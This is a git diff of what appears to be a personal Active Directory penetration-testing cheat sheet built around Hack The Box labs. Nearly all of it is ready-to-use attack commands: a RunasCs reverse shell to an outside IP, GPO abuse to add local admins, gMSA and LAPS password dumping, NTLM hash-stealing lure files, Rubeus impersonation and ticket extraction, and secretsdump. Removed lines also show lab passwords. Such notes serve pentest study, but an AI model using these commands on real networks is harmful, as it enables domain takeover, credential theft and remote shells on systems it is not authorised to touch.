@@ -8,47 +8,62 @@ krbrelayx, so many relays in impacket itself \[ntlmrelayx]
 
 {% embed url="https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet" %}
 
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
 <div align="left"><figure><img src="../.gitbook/assets/image (115).png" alt=""><figcaption></figcaption></figure></div>
+
+{% embed url="https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg" %}
+Ultimate AD Mindmap
+{% endembed %}
 
 ### Bloodhound
 
 ```
 ./SharpHound.exe --CollectionMethod All
-bloodhound-python -u 'f.frizzle' -p 'Jenni_Luvs_Magic23' -d frizz.htb -dc frizzdc.frizz.htb -ns 10.10.11.60 -c all
+bloodhound-python -u '[user]' -p '[password]' -d [domain] -dc [dc] -ns [ip] -c all
 ```
 
 #### SharpGPOAbuse - Modify Group Policy Objects
 
 ```
-.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount M.SchoolBus --GPOName whatever
+.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount [user] --GPOName [fake_GPO]
 gpupdate /force
 ```
 
 #### RunAs - Sudo for Windows
 
 ```
-.\RunasCs.exe "M.SchoolBus" '!suBcig@MehTed!R' powershell.exe -r 10.10.14.2:9001
+.\RunasCs.exe "[user]" '[password]' powershell.exe -r 10.10.14.2:9001
 ```
 
 #### gMSADumper - Reads any gMSA password blobs the user can access
 
 ```
-python3 gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d intelligence.htb
+python3 gMSADumper.py -u '[user]' -p '[password]' -d [domain]
 ```
 
 #### pyLAPS - Read LAPS if user has the privilege
 
 ```
-python3 pyLAPS.py --action get -d "timelapse.htb" -u "svc_deploy" -p 'E3R$Q62^12p7PLlC%KWaxuaV'
+python3 pyLAPS.py --action get -d "[domain]" -u "[user]" -p '[password]'
+```
+
+#### NTLMTheft - Creates files that steal NTLM hashes if clicked on/accessed
+
+```
+python ntlm_theft.py -g all -s 10.10.14.9 -f jtripz
 ```
 
 ### Rubeus
+
+{% embed url="https://www.hackingarticles.in/a-detailed-guide-on-rubeus/" %}
 
 ```
 .\Rubeus.exe hash /password:0xdf0xdf123 /user:0xdfFakeComputer /domain:support.htb
 .\Rubeus.exe s4u /user:0xdfFakeComputer$ /rc4:B1809AB221A7E1F4545BD9E24E49D5F4 /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt
 .\Rubeus.exe klist
 .\Rubeus.exe asktgt /user:Administrator /certificate:C:\Programdata\cert.pfx
+.\Rubeus.exe tgtdeleg /nowrap
 ```
 
 ## Kerberos
@@ -86,6 +101,7 @@ python3 GetUserSPNs.py [domain]/[user]:[password] -dc-ip [ip] -request <get tick
 
 ```
 sudo python3 secretsdump.py [domain]/[user]@[ip]
+sudo python3 secretsdump.py -k -no-pass [host_domain] -just-dc-user [user] #Using KRB5CCNAME
 ```
 
 #### getTGT - request a TGT and save it as ccache
